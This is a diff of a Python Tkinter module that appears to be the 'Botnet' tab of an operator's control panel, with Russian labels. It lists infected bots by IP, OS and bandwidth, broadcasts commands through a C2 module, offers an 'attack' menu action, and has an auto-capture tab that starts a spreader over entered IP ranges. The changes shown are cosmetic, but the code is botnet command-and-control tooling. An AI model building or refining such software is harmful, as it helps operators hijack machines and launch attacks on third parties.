@@ -3,7 +3,6 @@ from tkinter import ttk, messagebox, simpledialog
 import json, os, threading
 import folium, webbrowser
 from botnet.c2 import broadcast_command
-from engine.attack import AsyncAttackEngine
 from utils.logger import log
 from utils.widgets import ToolTip
 from botnet.auto_spreader import AutoSpreader
@@ -15,10 +14,11 @@ class BotnetTab(tk.Frame):
         self.spreader = AutoSpreader()
         self.build_ui()
         self.load_bots()
+
     def build_ui(self):
         nb = ttk.Notebook(self)
         nb.pack(fill=tk.BOTH, expand=True)
-        # Вкладка "Список"
+        # Список
         list_frame = ttk.Frame(nb)
         nb.add(list_frame, text="Список")
         control_frame = ttk.Frame(list_frame)
@@ -49,7 +49,7 @@ class BotnetTab(tk.Frame):
         self.progress.pack(fill=tk.X, padx=5, pady=2)
         self.status_label = ttk.Label(list_frame, text="Ботов: 0")
         self.status_label.pack(anchor=tk.W, padx=5)
-        # Вкладка "Автозахват"
+        # Автозахват
         auto_frame = ttk.Frame(nb)
         nb.add(auto_frame, text="Автозахват")
         ttk.Label(auto_frame, text="Статус:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
@@ -65,6 +65,7 @@ class BotnetTab(tk.Frame):
         self.ranges_text = tk.Text(auto_frame, height=4, width=30)
         self.ranges_text.grid(row=3, column=1, padx=5, pady=5)
         self.load_auto_settings()
+
     def load_bots(self):
         if os.path.exists("bots.json"):
             with open("bots.json", "r") as f:
@@ -87,11 +88,23 @@ class BotnetTab(tk.Frame):
             self.bot_data.append(bot)
         self.populate_tree()
         self.status_label.config(text=f"Ботов: {len(self.bot_data)}")
+
     def populate_tree(self, filtered=None):
         self.tree.delete(*self.tree.get_children())
         data = filtered if filtered is not None else self.bot_data
         for bot in data:
-            self.tree.insert("", tk.END, values=(bot.get("id",""),bot.get("ip",""),bot.get("os",""),bot.get("status",""),f"{bot.get('bandwidth',0)} Mbps"))
+            status = bot.get("status","offline")
+            tag = "online" if status == "online" else "offline"
+            self.tree.insert("", tk.END, values=(
+                bot.get("id",""),
+                bot.get("ip",""),
+                bot.get("os",""),
+                status,
+                f"{bot.get('bandwidth',0)} Mbps"
+            ), tags=(tag,))
+        self.tree.tag_configure('online', foreground='green')
+        self.tree.tag_configure('offline', foreground='red')
+
     def apply_filter(self):
         text = self.filter_entry.get().lower()
         if not text:
@@ -99,21 +112,25 @@ class BotnetTab(tk.Frame):
             return
         filtered = [b for b in self.bot_data if text in str(b).lower()]
         self.populate_tree(filtered)
+
     def sort_by(self, col):
         idx = ["id","ip","os","status","bandwidth"].index(col.lower())
         self.bot_data.sort(key=lambda b: str(b.get(col.lower(),"")))
         self.populate_tree()
+
     def show_context_menu(self, event):
         item = self.tree.identify_row(event.y)
         if item:
             self.tree.selection_set(item)
             self.context_menu.post(event.x_root, event.y_root)
+
     def get_selected_bot(self):
         selection = self.tree.selection()
         if selection:
             values = self.tree.item(selection[0], 'values')
             return {'id': values[0], 'ip': values[1], 'os': values[2], 'status': values[3], 'bandwidth': values[4]}
         return None
+
     def context_attack(self):
         bot = self.get_selected_bot()
         if bot:
@@ -152,7 +169,6 @@ class BotnetTab(tk.Frame):
             self.auto_status_label.config(text="Неактивен")
             self.toggle_btn.config(text="Запустить")
         else:
-            # Обновить настройки перед запуском
             self.save_auto_settings()
             self.spreader.load_settings("avz_settings.json")
             self.spreader.start()
